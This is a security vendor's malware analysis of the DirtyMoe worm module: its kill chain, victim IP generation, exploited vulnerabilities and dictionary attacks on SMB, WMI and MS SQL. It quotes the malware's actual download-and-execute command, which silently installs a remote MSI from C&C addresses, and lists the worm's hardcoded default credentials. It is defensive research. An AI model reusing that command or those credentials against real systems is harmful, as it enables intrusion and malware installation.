                    <div class="entry-content entry-single clearfix">
                        
<p class="has-normal-font-size">The DirtyMoe malware is deployed using various kits like PurpleFox or injected installers of Telegram Messenger that require user interaction. Complementary to this deployment, one of the DirtyMoe modules expands the malware using worm-like techniques that require no user interaction.</p>



<p class="has-normal-font-size">This research analyzes this worming module&#8217;s kill chain and the procedures used to launch/control the module through the DirtyMoe service. Other areas investigated include evaluating the risk of identified exploits used by the worm and detailed analysis of how its victim selection algorithm works. Finally, we examine this performance and provide a thorough examination of the entire worming workflow.</p>



<p class="has-normal-font-size">The analysis showed that the worming module targets older well-known vulnerabilities, e.g., EternalBlue and Hot Potato Windows Privilege Escalation. Another important discovery is a dictionary attack using Service Control Manager Remote Protocol (SCMR), WMI, and MS SQL services. Finally, an equally critical outcome is discovering the algorithm that generates victim target IP addresses based on the worming module&#8217;s geographical location.</p>



<p class="has-normal-font-size">One worm module can generate and attack hundreds of thousands of private and public IP addresses per day; many victims are at risk since many machines still use unpatched systems or weak passwords. Furthermore, the DirtyMoe malware uses a modular design; consequently, we expect other worming modules to be added to target prevalent vulnerabilities.</p>



<h4 class="wp-block-heading" id="Section1">1. Introduction</h4>



<p class="has-normal-font-size">DirtyMoe, the successful malware we documented in detail in the <a href="https://decoded.avast.io/martinchlumecky/dirtymoe-1/" target="_blank" rel="noreferrer noopener">previous series</a>, also implements mechanisms to reproduce itself. The most common way of deploying the DirtyMoe malware is via phishing campaigns or malvertising. In this series, we will focus on techniques that help DirtyMoe to spread in the wild.</p>



<p class="has-normal-font-size">The PurpleFox exploit kit (EK) is the most frequently observed approach to deploy DirtyMoe; the immediate focus of PurpleFox EK is to exploit a victim machine and install DirtyMoe. PurpleFox EK primarily abuses vulnerabilities in the Internet Explorer browser via phishing emails or popunder ads. For example, Guardicore described a worm spread by PurpleFox that abuses SMB services with weak passwords <a href="#references">[2]</a>, infiltrating poorly secured systems. Recently, Minerva Labs has described the new infection vector installing DirtyMoe via an injected Telegram Installer <a href="#references">[1]</a>.</p>



<p class="has-normal-font-size">Currently, we are monitoring three approaches used to spread DirtyMoe in the wild; <strong>Figure 1</strong> illustrates the relationship between the individual concepts. The primary function of the DirtyMoe malware is crypto-mining; it is deployed to victims&#8217; machines using different techniques. We have observed PurpleFox EK, PurleFox Worm, and injected Telegram Installers as mediums to spread and install DirtyMoe; we consider it highly likely that other mechanisms are used in the wild.</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-01.-Mediums-of-DirtyMoe.png"><img decoding="async" width="812" height="415" src="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-01.-Mediums-of-DirtyMoe.png" alt="" class="wp-image-5258" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-01.-Mediums-of-DirtyMoe.png 812w, https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-01.-Mediums-of-DirtyMoe-300x153.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-01.-Mediums-of-DirtyMoe-768x393.png 768w" sizes="(max-width: 812px) 100vw, 812px" /></a><figcaption><strong>Figure 1.</strong> Mediums of DirtyMoe</figcaption></figure></div>



<p class="has-normal-font-size">In the <a href="https://decoded.avast.io/martinchlumecky/dirtymoe-4/" target="_blank" rel="noreferrer noopener">fourth series</a> on this malware family, we described the deployment of the DirtyMoe service. <strong>Figure 2</strong> illustrates the DirtyMoe hierarchy. The DirtyMoe service is run as a <code>svchost</code> process that starts two other processes: DirtyMoe Core and Executioner, which manages DirtyMoe modules. Typically, the executioner loads two modules; one for Monero mining and the other for worming replication.</p>



<p></p>



<div id="Fig2" class="wp-block-image"><figure class="aligncenter size-full"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-02.-DirtyMoe-hierarchy-1.png"><img decoding="async" width="690" height="382" src="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-02.-DirtyMoe-hierarchy-1.png" alt="" class="wp-image-5266" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-02.-DirtyMoe-hierarchy-1.png 690w, https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-02.-DirtyMoe-hierarchy-1-300x166.png 300w" sizes="(max-width: 690px) 100vw, 690px" /></a><figcaption><strong>Figure 2.</strong> DirtyMoe hierarchy</figcaption></figure></div>



<p class="has-normal-font-size">Our research has been focused on worming since it seems that worming is one of the main mediums to spread the DirtyMoe malware. The PurpleFox worm described by Guardicore <a href="#references">[2]</a> is just the tip of the worming iceberg because DirtyMoe utilizes sophisticated algorithms and methods to spread itself into the wild and even to spread laterally in the local network.</p>



<p class="has-normal-font-size">The goal of the DirtyMoe worm is to exploit a target system and install itself into a victim machine. The DirtyMoe worm abuses several known vulnerabilities as follow:</p>



<ul class="has-normal-font-size wp-block-list"><li><code>CVE:2019-9082</code>: ThinkPHP &#8211; Multiple PHP Injection RCEs</li><li><code>CVE:2019-2725</code>: Oracle Weblogic Server &#8211; &#8216;AsyncResponseService&#8217; Deserialization RCE</li><li><code>CVE:2019-1458</code>: WizardOpium Local Privilege Escalation</li><li><code>CVE:2018-0147</code>: Deserialization Vulnerability</li><li><code>CVE:2017-0144</code>: EternalBlue SMB Remote Code Execution (MS17-010)</li><li><code>MS15-076</code>: RCE Allow Elevation of Privilege (Hot Potato Windows Privilege Escalation)</li><li><code>Dictionary attacks</code> to MS SQL Servers, SMB, and Windows Management Instrumentation (WMI)</li></ul>



<p class="has-normal-font-size">The prevalence of DirtyMoe is increasing in all corners of the world; this may be due to the DirtyMoe worm&#8217;s strategy of generating targets using a pseudo-random IP generator that considers the worm&#8217;s geological and local location. A consequence of this technique is that the worm is more flexible and effective given its location. In addition, DirtyMoe can be expanded to machines hidden behind NAT as this strategy also provides lateral movement in local networks. A single DirtyMoe instance can generate and attack up to 6,000 IP addresses per second.</p>



<p class="has-normal-font-size">The insidiousness of the whole worm&#8217;s design is its modularization controlled by C&amp;C servers. For example, DirtyMoe has a few worming modules targeting a specific vulnerability, and C&amp;C determines which worming module will be applied based on information sent by a DirtyMoe instance.</p>



<p class="has-normal-font-size">The DirtyMoe worming module implements three basic phases common to all types of vulnerabilities. First, the module generates a list of IP addresses to target in the initial phase. Then, the second phase attacks specific vulnerabilities against these targets. Finally, the module performs dictionary attacks against live machines represented by the randomly generated IP addresses. The most common modules that we have observed are SMB and SQL.</p>



<p class="has-normal-font-size">This article focuses on the DirtyMoe worming module. We analyze and discuss the worming strategy, which exploits are abused by the malware author, and a module behavior according to geological locations. One of the main topics is the performance of IP address generation, which is crucial for the malware&#8217;s success. We are also looking for specific implementations of abused exploits, including their origins.</p>



<h4 class="wp-block-heading" id="Section2">2. Worm Kill Chain</h4>



<p class="has-normal-font-size">We can describe the general workflow of the DirtyMoe worming module through the kill chain. <strong>Figure 3</strong> illustrates stages of the worming workflow.</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-03.-Worming-module-workflow.png"><img loading="lazy" decoding="async" width="869" height="216" src="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-03.-Worming-module-workflow.png" alt="" class="wp-image-5262" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-03.-Worming-module-workflow.png 869w, https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-03.-Worming-module-workflow-300x75.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-03.-Worming-module-workflow-768x191.png 768w" sizes="(max-width: 869px) 100vw, 869px" /></a><figcaption><strong>Figure 3</strong>. Worming module workflow</figcaption></figure></div>



<p class="has-normal-font-size"><strong>Reconnaissance</strong><br>The worming module generates targets at random but also considers the geolocation of the module. Each generated target is tested for the presence of vulnerable service versions; the module connects to the specific port where attackers expect vulnerable services and verifies whether the victim&#8217;s machine is live. If the verification is successful, the worming module collects basic information about the victim&#8217;s OS and versions of targeted services.</p>



<p class="has-normal-font-size"><strong>Weaponization</strong><br>The C&amp;C server appears to determine which specific module is used for worming without using any victim&#8217;s information. Currently, we do not precisely know what algorithm is used for module choice but suspect it depends on additional information sent to the C&amp;C server.</p>



<p class="has-normal-font-size">When the module verifies that a targeted victim&#8217;s machine is potentially exploitable, an appropriate payload is prepared, and an attack is started. The payload must be modified for each attack since a remote code execution (RCE) command is valid only for a few minutes.</p>



<p class="has-normal-font-size"><strong>Delivery</strong><br>In this kill chain phase, the worming module sends the prepared payload. The payload delivery is typically performed using protocols of targeted services, e.g., SMB or MS SQL protocols.</p>



<p class="has-normal-font-size"><strong>Exploitation and Installation</strong><br>If the payload is correct and the victim’s machine is successfully exploited, the RCE command included in the payload is run. Consequently, the DirtyMoe malware is deployed, as was detailed in the <a href="https://decoded.avast.io/martinchlumecky/dirtymoe-4/" target="_blank" rel="noreferrer noopener">previous article (DirtyMoe: Deployment)</a>.</p>



<h4 class="wp-block-heading" id="Section3">3. RCE Command</h4>



<p class="has-normal-font-size">The main goal of the worming module is to achieve RCE under administrator privileges and install a new DirtyMoe instance. The general form of the executed command (<code>@RCE@</code>) is the same for each worming module:<br><code>Cmd /c for /d %i in (@WEB@) do Msiexec /i http://%i/@FIN@ /Q</code></p>



<p class="has-normal-font-size">The command usually iterates through three IP addresses of C&amp;C servers, including ports. IPs are represented by the placeholder <code>@WEB@</code> filled on runtime. Practically, <code>@WEB@</code> is regenerated for each payload sent since the IPs are rotated every minute utilizing sophisticated algorithms; this was described in Section 2 of the <a href="https://decoded.avast.io/martinchlumecky/dirtymoe-1/" target="_blank" rel="noreferrer noopener">first blog</a>.</p>



<p class="has-normal-font-size">The second placeholder is <code>@FIN@</code> representing the DirtyMoe object&#8217;s name; this is, in fact, an MSI installer package. The package filename is in the form of a hash &#8211; <code>[A-F0-9]{8}\.moe</code>. The hash name is generated using a hardcoded hash table, methods for rotations and substrings, and by the <code>MS_RPC_&lt;n&gt;</code> string, where <code>n</code> is a number determined by the DirtyMoe service.</p>



<p class="has-normal-font-size">The core of the <code>@RCE@</code> command is the execution of the remote DirtyMoe object (<code>http://</code>) via <code>msiexec</code> in silent mode (<code>/Q</code>). An example of a specific <code>@RCE@</code> command is:<br><code>Cmd /c for /d %i in (45.32.127.170:16148 92.118.151.102:19818 207.246.118.120:11410) do Msiexec /i http://%i/6067C695.moe /Q</code></p>



<h4 class="wp-block-heading" id="Section4">4. IP Address Generation</h4>



<p class="has-normal-font-size">The key feature of the worming module is the generation of IP addresses (IPs) to attack. There are six methods used to generate IPs with the help of a pseudo-random generator; each method focuses on a different IPv4 Class. Accordingly, this factor contributes to the globally uniform distribution of attacked machines and enables the generation of more usable IP addresses to target.</p>



<h5 class="wp-block-heading" id="Section4-1">4.1 Class B from IP Table</h5>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Section4.1-01-1.png"><img loading="lazy" decoding="async" width="413" height="100" src="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Section4.1-01-1.png" alt="" class="wp-image-5270" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Section4.1-01-1.png 413w, https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Section4.1-01-1-300x73.png 300w" sizes="(max-width: 413px) 100vw, 413px" /></a></figure></div>



<p class="has-normal-font-size">The most significant proportion of generated addresses is provided by 10 threads generating IPs using a hardcoded list of 24,622 items. Each list item is in form <code>0xXXXX0000</code>, representing IPs of Class B. Each thread generates IPs based on the algorithms as follows:</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Section4.1-02-1.png"><img loading="lazy" decoding="async" width="341" height="111" src="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Section4.1-02-1.png" alt="" class="wp-image-5336" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Section4.1-02-1.png 341w, https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Section4.1-02-1-300x98.png 300w" sizes="(max-width: 341px) 100vw, 341px" /></a></figure></div>



<p class="has-normal-font-size">The algorithm randomly selects a Class B address from the list and 65,536 times generates an entirely random number that adds to the selected Class B addresses. The effect is that the final IP address generated is based on the geological location hardcoded in the list.</p>



<p class="has-normal-font-size"><strong>Figure 4</strong> shows the geological distribution of hardcoded addresses. The continent distribution is separated into four parts: Asia, North America, Europe, and others (South America, Africa, Oceania). We verified this approach and generated 1M addresses using the algorithm. The result has a similar continental distribution. Hence, the implementation ensures that the IP addresses distribution is uniform.</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-04.-Geological-distribution-of-hardcoded-class-B-IPs-1.png"><img loading="lazy" decoding="async" width="869" height="542" src="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-04.-Geological-distribution-of-hardcoded-class-B-IPs-1.png" alt="" class="wp-image-5329" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-04.-Geological-distribution-of-hardcoded-class-B-IPs-1.png 869w, https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-04.-Geological-distribution-of-hardcoded-class-B-IPs-1-300x187.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-04.-Geological-distribution-of-hardcoded-class-B-IPs-1-768x479.png 768w" sizes="(max-width: 869px) 100vw, 869px" /></a><figcaption><strong>Figure 4</strong>. Geological distribution of hardcoded class B IPs</figcaption></figure></div>

<p class="has-normal-font-size">Three other algorithms generate IPs based on an IP address of a machine (IPm) where the worming module runs. Consequently, the worming module targets machines in the nearby surroundings.</p>



<p class="has-normal-font-size">Addresses are derived from the IPm masked to the appropriate Class A/B/C, and a random number representing the lower Class is added; as shown in&nbsp;the following pseudo-code.</p>

<h5 class="wp-block-heading" id="Section4-4">4.4 Derived Local IPs</h5>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Section4.4-01.png"><img loading="lazy" decoding="async" width="420" height="96" src="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Section4.4-01.png" alt="" class="wp-image-5278" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Section4.4-01.png 420w, https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Section4.4-01-300x69.png 300w" sizes="(max-width: 420px) 100vw, 420px" /></a></figure></div>



<p class="has-normal-font-size">The last IP generating method is represented by one thread that scans interfaces attached to local networks. The worming module lists local IPs using <code>gethostbyname()</code> and processes one local address every two hours.</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Section4.4-02.png"><img loading="lazy" decoding="async" width="273" height="145" src="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Section4.4-02.png" alt="" class="wp-image-5279"/></a></figure></div>



<p class="has-normal-font-size">Each local IP is masked to Class C, and 255 new local addresses are generated based on the masked address. As a result, the worming module attacks all local machines close to the infected machine in the local network.</p>



<h4 class="wp-block-heading" id="Section5">5. Attacks to Abused Vulnerabilities</h4>



<p class="has-normal-font-size">We have detected two worming modules which primarily attack SMB services and MS SQL databases. Our team has been lucky since we also discovered something rare: a worming module containing exploits targeting PHP, Java Deserialization, and Oracle Weblogic Server that was still under development. In addition, the worming modules include a packed dictionary of 100,000-words used with dictionary attacks.</p>



<h5 class="wp-block-heading" id="5-1-eternalblue">5.1 EternalBlue</h5>



<p class="has-normal-font-size">One of the main vulnerabilities is <code>CVE:2017-0144</code>: EternalBlue SMB Remote Code Execution (patched by Microsoft in MS17-010). It is still bewildering how many EternalBlue attacks are still observed &#8211; Avast is still blocking approximately 20 million attempts for the EternalBlue attack every month.</p>



<p class="has-normal-font-size">The worming module focuses on the Windows version from Windows XP to Windows 8. We have identified that the EternalBlue implementation is the same as described in exploit-db <a href="#references">[3]</a>, and an effective payload including the <code>@RCE@</code> command is identical to DoublePulsar <a href="#references">[4]</a>. Interestingly, the whole EternalBlue payload is hardcoded for each Windows architecture, although the payload can be composed for each platform separately.</p>



<h5 class="wp-block-heading" id="5-2-service-control-manager-remote-protocol">5.2 Service Control Manager Remote Protocol</h5>



<p class="has-normal-font-size">No known vulnerability is used in the case of Service Control Manager Remote Protocol (SCMR) <a href="#references">[5]</a>. The worming module attacks SCMR through a dictionary attack. The first phase is to guess an administrator password. The details of the dictionary attack are described in <a href="#Section6-4">Section 6.4</a>.</p>



<p class="has-normal-font-size">If the dictionary attack is successful and the module guesses the password, a new Windows service is created and started remotely via RPC over the SMB service. <strong>Figure 5</strong> illustrates the network communication of the attack. Binding to the SCMR is identified using UUID <code>{367ABB81-9844-35F1-AD32- 98F038001003}</code>. On the server-side, the worming module as a client writes commands to the <code>\PIPE\svcctl</code> pipe. The first batch of commands creates a new service and registers a command with the malicious <code>@RCE@</code> payload. The new service is started and is then deleted to attempt to cover its tracks.</p>



<p class="has-normal-font-size">The Microsoft HTML Application Host (<code>mshta.exe</code>) is used as a LOLbin to execute and create ShellWindows and run <code>@RCE@</code>. The advantage of this proxy execution is that <code>mshta.exe</code> is typically marked as trusted; some defenders may not detect this misuse of <code>mshta.exe</code>.</p>

<h5 class="wp-block-heading" id="5-3-windows-management-instrumentation">5.3 Windows Management Instrumentation</h5>



<p class="has-normal-font-size">The second method that does not misuse any known vulnerability is a dictionary attack to Windows Management Instrumentation (WMI). The workflow is similar to the SCMR attack. Firstly, the worming module must also guess the password of a victim administrator account. The details of the dictionary attack are described in <a href="#Section6-4">Section 6.4</a>.</p>



<p class="has-normal-font-size">The attackers can use WMI to manage and access data and resources on remote computers <a href="#references">[6]</a>. If they have an account with administrator privileges, full access to all system resources is available remotely.</p>



<p class="has-normal-font-size">The malicious misuse lies in the creation of a new process that runs <code>@RCE@</code> via a WMI script; see <strong>Figure 7</strong>. DirtyMoe is then installed in the following six steps:</p>



<ol class="has-normal-font-size wp-block-list"><li>Initialize the COM library.</li><li>Connect to the default namespace <code>root/cimv2</code> containing the WMI classes for management.</li><li>The <code>Win32_Process</code> class is created, and <code>@RCE@</code> is set up as a command-line argument.</li><li><code>Win32_ProcessStartup</code> represents the startup configuration of the new process. The worming module sets a process window to a hidden state, so the execution is complete silently.</li><li>The new process is started, and the DirtyMoe installer is run.</li><li>Finally, the WMI script is finished, and the COM library is cleaned up.</li></ol>

<h5 class="wp-block-heading" id="5-4-microsoft-sql-server">5.4 Microsoft SQL Server</h5>



<p class="has-normal-font-size">Attacks on Microsoft SQL Servers are the second most widespread attack in terms of worming modules. Targeted MS SQL Servers are 2000, 2005, 2008, 2012, 2014, 2016, 2017, 2019.</p>



<p class="has-normal-font-size">The worming module also does not abuse any vulnerability related to MS SQL. However, it uses a combination of the dictionary attack and <code>MS15-076</code>: “RCE Allow Elevation of Privilege” known as “Hot Potato Windows Privilege Escalation”. Additionally, the malware authors utilize the <code>MS15-076</code> implementation known as Tater, the PowerSploit function Invoke-ReflectivePEInjection, and <code>CVE-2019-1458</code>: “WizardOpium Local Privilege Escalation” exploit.</p>



<p class="has-normal-font-size">The first stage of the MS SQL attack is to guess the password of an attacked MS SQL server. The first batch of username/password pairs is hardcoded. The malware authors have collected the hardcoded credentials from publicly available sources. It contains fifteen default passwords for a few databases and systems like Nette Database, Oracle, Firebird, Kingdee KIS, etc. The complete hardcoded credentials are as follows: <code>401hk/401hk_@_</code>, <code>admin/admin</code>, <code>bizbox/bizbox</code>, <code>bwsa/bw99588399</code>, <code>hbv7/zXJl@mwZ</code>, <code>kisadmin/ypbwkfyjhyhgzj</code>, <code>neterp/neterp</code>, <code>ps/740316</code>, <code>root/root</code>, <code>sp/sp</code>, <code>su/t00r_@_</code>, <code>sysdba/masterkey</code>, <code>uep/U_tywg_2008</code>, <code>unierp/unierp</code>, <code>vice/vice</code>.</p>



<p class="has-normal-font-size">If the first batch is not successful, the worming module attacks using the hardcoded dictionary. The detailed workflow of the dictionary attack is described in <a href="#Section6-4">Section 6.4</a>.</p>



<p class="has-normal-font-size">If the module successfully guesses the username/password of the attacked MS SQL server, the module executes corresponding payloads based on the Transact-SQL procedures. There are five methods launched one after another.</p>



<ol class="has-normal-font-size wp-block-list"><li><em>sp_start_job</em><br>The module creates, schedules, and immediately runs a task with <strong><a href="#payload-1">Payload 1</a></strong>.</li><li><em>sp_makewebtask</em><br>The module creates a task that produces an HTML document containing <strong><a href="#payload-2">Payload 2</a></strong>.</li><li><em>sp_OAMethod</em><br>The module creates an OLE object using the VBScript “WScript.Shell“ and runs <strong><a href="#payload-3">Payload 3</a></strong>.</li><li><em>xp_cmdshell</em><br>This method spawns a Windows command shell and passes in a string for execution represented by <strong><a href="#payload-3">Payload 3</a></strong>.</li><li><em>Run-time Environment</em><br><strong><a href="#payload-4">Payload 4</a></strong> is executed as a .NET assembly.</li></ol>



<p class="has-normal-font-size">In brief, there are four payloads used for the DirtyMoe installation. The SQL worming module defines a placeholder <code>@SQLEXEC@</code> representing a full URL to the MSI installation package located in the C&amp;C server. If any of the payloads successfully performed a privilege escalation, the DirtyMoe installation is silently launched via MSI installer; see our DirtyMoe <a href="https://decoded.avast.io/martinchlumecky/dirtymoe-4/" target="_blank" rel="noreferrer noopener">Deployment blog post</a> for more details.</p>

<h4 class="wp-block-heading" id="Section6">6. Worming Module Execution</h4>



<p class="has-normal-font-size">The worming module is managed by the DirtyMoe service, which controls its configuration, initialization, and worming execution. This section describes the lifecycle of the worming module.</p>



<h5 class="wp-block-heading" id="6-1-configuration">6.1 Configuration</h5>



<p class="has-normal-font-size">The DirtyMoe service contacts one of the C&amp;C servers and downloads an appropriate worming module into a Shim Database (SDB) file located at <code>%windir%\apppatch\TK&lt;volume-id&gt;MS.sdb</code>. The worming module is then decrypted and injected into a new <code>svchost.exe</code> process, as <strong><a href="#Fig2">Figure 2</a></strong> illustrates.</p>



<p class="has-normal-font-size">The encrypted module is a PE executable that contains additional placeholders. The DirtyMoe service passes configuration parameters to the module via these placeholders. This approach is identical to other DirtyMoe modules; however, some of the placeholders are not used in the case of the worming module.</p>



<p class="has-normal-font-size">The placeholders overview is as follows:</p>



<ul class="has-normal-font-size wp-block-list"><li><code>@TaskGuid@</code>: N/A in worming module</li><li><code>@IPsSign@</code>: N/A in worming module</li><li><code>@RunSign@</code>: Mutex created by the worming module that is controlled by the DirtyMoe service</li><li><code>@GadSign@</code>: ID of DirtyMoe instance registered in C&amp;C</li><li><code>@FixSign@</code>: Type of worming module, e.g, ScanSmbHs5</li><li><code>@InfSign@</code>: Worming module configuration</li></ul>



<h5 class="wp-block-heading" id="6-2-initialization">6.2 Initialization</h5>



<p class="has-normal-font-size">When the worming module, represented by the new process, is injected and resumed by the DirtyMoe service, the module initialization is invoked. Firstly, the module unpacks a word dictionary containing passwords for a dictionary attack. The dictionary consists of 100,000 commonly used passwords compressed using LZMA. Secondly, internal structures are established as follows:</p>



<p class="has-normal-font-size"><strong>IP Address Backlog</strong><br>The module stores discovered IP addresses with open ports of interest. It saves the IP address and the timestamp of the last port check.</p>



<p class="has-normal-font-size"><strong>Dayspan and Hourspan Lists</strong><br>These lists manage IP addresses and their insertion timestamps used for the dictionary attack. The IP addresses are picked up based on a threshold value defined in the configuration. The IP will be processed if the IP address timestamp surpasses the threshold value of the day or hour span. If, for example, the threshold is set to 1, then if a day/hour span of the current date and a timestamp is greater than 1, a corresponding IP will be processed. The <em>Dayspan list</em> registers IPs generated by <a href="#Section4-1">Class B from IP Table</a>, <a href="#Section4-2">Fully Random IP</a>, and <a href="#Section4-3">Derived Classes A</a> methods; in other words, IPs that are further away from the worming module location. On the other hand, the <em>Hourspan list</em> records IPs located closer.</p>



<p class="has-normal-font-size">Thirdly, the module reads its configuration described by the <code>@InfSign@</code> placeholder. The configuration matches this pattern: <code>&lt;IP&gt;|&lt;PNG_ID&gt;|&lt;timeout&gt;|[SMB:HX:PX1.X2.X3:AX:RX:BX:CX:DX:NX:SMB]</code></p>



<ul class="has-normal-font-size wp-block-list"><li><code>IP</code> is the number representing the machine IP from which the attack will be carried out. The IP is input for the methods generating IPs; see <a href="#Section4-1">Section 4</a>. If the IP is not available, the default address <kbd>98.126.89.1</kbd> is used.</li><li><code>PNG_ID</code> is the number used to derive the hash-name that mirrors the DirtyMoe object name (MSI installer package) stored at C&amp;C. The hashname is generated using <code>MS_RPC_&lt;n&gt;</code> string where <code>n</code> is <code>PNG_ID</code>; see <a href="#Section3">Section 3</a>.</li><li><code>Timeout</code> is the default timeout for connections to the attacked services in seconds.</li><li><code>HX</code> is a threshold for comparing IP timestamps stored in the <em>Dayspan and Hourspan lists</em>. The comparison ascertains whether an IP address will be processed if the timestamp of the IP address exceeds the day/hour threshold.</li><li><code>P</code> is the flag for the dictionary attack.<ul><li><code>X1</code> number determines how many initial passwords will be used from the password dictionary to increase the probability of success &#8211; the dictionary contains the most used passwords at the beginning.</li><li><code>X2</code> number is used for the second stage of the dictionary attack if the first <code>X1</code> passwords are unsuccessful. Then the worming module tries to select <code>X2</code> passwords from the dictionary randomly.</li><li><code>X3</code> number defines how many threads will process the <em>Dayspan and Hourspan lists</em>; more precisely, how many threads will attack the registered IP addresses in the <em>Dayspan/Hourspan lists</em>.</li></ul></li><li><code>AX</code>: how many threads will generate IP addresses using <a href="#Section4-1">Class B from IP Table</a> methods.</li><li><code>RX</code>: how many threads for the <a href="#Section4-2">Fully Random IP</a> method.</li><li><code>BX</code>, <code>CX</code>, <code>DX</code>: how many threads for the <a href="#Section4-3">Derived Classes A, B, C</a> methods.</li><li><code>NX</code> defines a thread quantity for the <a href="#Section4-4">Derived Local IPs</a> method.</li></ul>



<p class="has-normal-font-size">The typical configuration can be <code>217.xxx.xxx.xxx|5|2|[SMB:H1:P1.30.3:A10:R3:B3:C3:D1:N3:SMB]</code></p>



<p class="has-normal-font-size">Finally, the worming module starts all threads defined by the configuration, and the worming process and attacks are started.</p>



<h5 class="wp-block-heading" id="6-3-worming">6.3 Worming</h5>



<p class="has-normal-font-size">The worming process has five phases run, more or less, in parallel. <strong>Figure 16</strong> has an animation of the worming process.</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-16.-Worming-module-workflow.gif"><img loading="lazy" decoding="async" width="869" height="680" src="https://decoded.avast.io/wp-content/uploads/sites/2/2022/02/Figure-16.-Worming-module-workflow.gif" alt="" class="wp-image-5306"/></a><figcaption><strong>Figure 16</strong>. Worming module workflow</figcaption></figure></div>



<h6 class="wp-block-heading" id="phase-1"><strong>Phase 1</strong></h6>



<p class="has-normal-font-size">The worming module usually starts 23 threads generating IP addresses based on <a href="#Section4">Section 4</a>. The IP addresses are classified into two groups: day-span and hour-span.</p>



<h6 class="wp-block-heading" id="phase-2"><strong>Phase 2</strong></h6>



<p class="has-normal-font-size">The second phase runs in parallel with the first; its goal is to test generated IPs. Each specific module targets defined ports ​that are verified via sending a zero-length transport datagram. If the port is active and ready to receive data, the IP address of the active port is added to <em>IP Address Backlog</em>. Additionally, the SMB worming module immediately tries the EternalBlue attack within the port scan.</p>



<h6 class="wp-block-heading" id="phase-3"><strong>Phase 3</strong></h6>



<p class="has-normal-font-size">The IP addresses verified in Phase 2 are also registered into the <em>Dayspan and Hourspan lists</em>. The module keeps only 100 items (IP addresses), and the lists are implemented as a queue. Therefore, some IPs can be removed from these lists if the IP address generation is too fast or the dictionary attacks are too slow. However, the removed addresses are still present in the <em>IP Address Backlog</em>.</p>



<h6 class="wp-block-heading" id="phase-4"><strong>Phase 4</strong></h6>



<p class="has-normal-font-size">The threads created based on the X3 configuration parameters process and manage the items (IPs) of <em>Dayspan and Hourspan lists</em>. Each thread picks up an item from the corresponding list, and if the defined day/hour threshold (HX parameter) is exceeded, the module starts the dictionary attack to the picked-up IP address.</p>



<h6 class="wp-block-heading" id="phase-5"><strong>Phase 5</strong></h6>



<p class="has-normal-font-size">Each generated and verified IP is associated with a timestamp of creation. The last phase is activated if the previous timestamp is older than 10 minutes, i.e., if the IP generation is suspended for any reason and no new IPs come in 10 minutes. Then one dedicated thread extracts IPs from the backlog and processes these IPs from the beginning; These IPs are processed as per Phase 2, and the whole worming process continues.</p>



<h5 class="wp-block-heading" id="Section6-4">6.4 Dictionary Attack</h5>



<p class="has-normal-font-size">The dictionary attack targets two administrator user names, namely <code>administrator</code> for SMB services and <code>sa</code> for MS SQL servers. If the attack is successful, the worming module infiltrates a targeted system utilizing an attack series composed of techniques described in <a href="#Section5">Section 5</a>:</p>



<ul class="has-normal-font-size wp-block-list"><li>Service Control Manager Remote Protocol (SCMR)</li><li>Windows Management Instrumentation (WMI)</li><li>Microsoft SQL Server (SQL)</li></ul>



<p class="has-normal-font-size">The first attack attempt is sent with an empty password. The module then addresses three states based on the attack response as follows:</p>



<ul class="has-normal-font-size wp-block-list"><li>No connection: the connection was not established, although a targeted port is open &#8211; a targeted service is not available on this port.</li><li>Unsuccessful: the targeted service/system is available, but authentication failed due to an incorrect username or password.</li><li>Success: the targeted service/system uses the empty password.</li></ul>



<h6 class="wp-block-heading" id="administrator-account-has-an-empty-password"><strong>Administrator account has an empty password&nbsp;</strong></h6>



<p class="has-normal-font-size">If the administrator account is not protected, the whole worming process occurs quickly (this is the best possible outcome from the attacker&#8217;s point of view). The worming module then proceeds to infiltrate the targeted system with the attack series (SCMR, WMI, SQL) by sending the empty password.</p>



<h6 class="wp-block-heading" id="bad-username-or-authentication-information"><strong>Bad username or authentication information</strong></h6>



<p class="has-normal-font-size">A more complex situation occurs if the targeted services are active, and it is necessary to attack the system by applying the password dictionary.</p>



